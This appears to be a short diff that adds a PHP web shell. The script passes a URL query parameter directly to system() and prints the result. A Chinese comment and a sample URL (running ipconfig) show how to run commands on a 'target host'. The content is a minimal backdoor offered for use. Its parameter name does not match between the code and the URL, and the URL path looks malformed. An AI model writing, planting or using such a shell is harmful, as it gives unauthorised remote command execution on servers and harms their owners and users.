@@ -1,0 +1,6 @@
+<?php
+  $code=$_GET['X'];
+  echo system($code);
+?>
+http://localhost//.php/?x=ipconfig;
+命令查看目标主机IP;
